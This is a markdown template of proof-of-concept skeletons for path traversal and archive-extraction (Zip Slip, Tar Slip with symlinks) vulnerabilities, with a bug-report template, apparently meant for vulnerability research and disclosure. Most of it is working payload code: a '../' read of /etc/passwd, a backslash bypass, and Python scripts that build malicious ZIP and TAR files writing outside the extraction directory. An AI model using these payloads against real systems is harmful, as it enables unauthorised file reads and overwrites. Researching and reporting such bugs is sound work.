# PoC Skeleton -- Path Traversal & Zip Slip

## Classic Path Traversal PoC

```js
/**
 * CVE-CANDIDATE: Path Traversal in [package-name] [version]
 * CWE: CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
 * CVSS: 7.5 HIGH (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
 */
const pkg = require('[package-name]');

// Payload: directory traversal to read /etc/passwd
const payload = '../../../etc/passwd';
const result = pkg.readFile(payload);
console.log('[+] File contents:', result);
```

## Zip Slip PoC (Creating Malicious ZIP)

```python
#!/usr/bin/env python3
"""Create a malicious ZIP with path traversal entries."""
import zipfile
import io

def create_zipslip():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as zf:
        # Entry with ../ in filename -- writes outside extraction dir
        zf.writestr('../../../../tmp/pwned.txt', 'ZIP_SLIP_PROOF')
    buf.seek(0)
    with open('malicious.zip', 'wb') as f:
        f.write(buf.read())
    print('[+] Created malicious.zip with Zip Slip payload')

create_zipslip()
```

## Tar Slip with Symlink

```python
#!/usr/bin/env python3
"""Create a malicious TAR with symlink chain."""
import tarfile
import io

def create_tarslip():
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode='w') as tf:
        # Step 1: Create symlink pointing outside
        info = tarfile.TarInfo(name='link')
        info.type = tarfile.SYMTYPE
        info.linkname = '/tmp'
        tf.addfile(info)

        # Step 2: File targeting the symlink -- writes to /tmp/pwned.txt
        info2 = tarfile.TarInfo(name='link/pwned.txt')
        info2.size = len(b'TAR_SLIP_PROOF')
        tf.addfile(info2, io.BytesIO(b'TAR_SLIP_PROOF'))

    buf.seek(0)
    with open('malicious.tar', 'wb') as f:
        f.write(buf.read())
    print('[+] Created malicious.tar with symlink Zip Slip')

create_tarslip()
```

## Backslash Bypass Variant

```js
// If the library only checks for forward slash traversal
const payload = '..\\..\\..\\etc\\passwd';
const result = pkg.readFile(payload);
```

## Verification

After extraction, check if the file was written outside the target directory:
```bash
# Check if file was created
ls -la /tmp/pwned.txt
cat /tmp/pwned.txt
# Expected: ZIP_SLIP_PROOF or TAR_SLIP_PROOF
```

## Reporting Template

```
## Vulnerability: Path Traversal / Zip Slip in [package]

**File**: `src/[file].js:LINE`
**Sink**: `fs.writeFile()` at line LINE
**Source**: Archive entry filename / user-supplied path
**Validation**: [none / uses path.join only (insufficient)]

### Impact
Arbitrary file write outside the intended directory. An attacker can
craft a malicious archive that overwrites arbitrary files when extracted.

### Reproduction
1. Run: `python3 create_malicious_zip.py`
2. Extract with vulnerable library
3. Observe: `/tmp/pwned.txt` created outside extraction directory
```
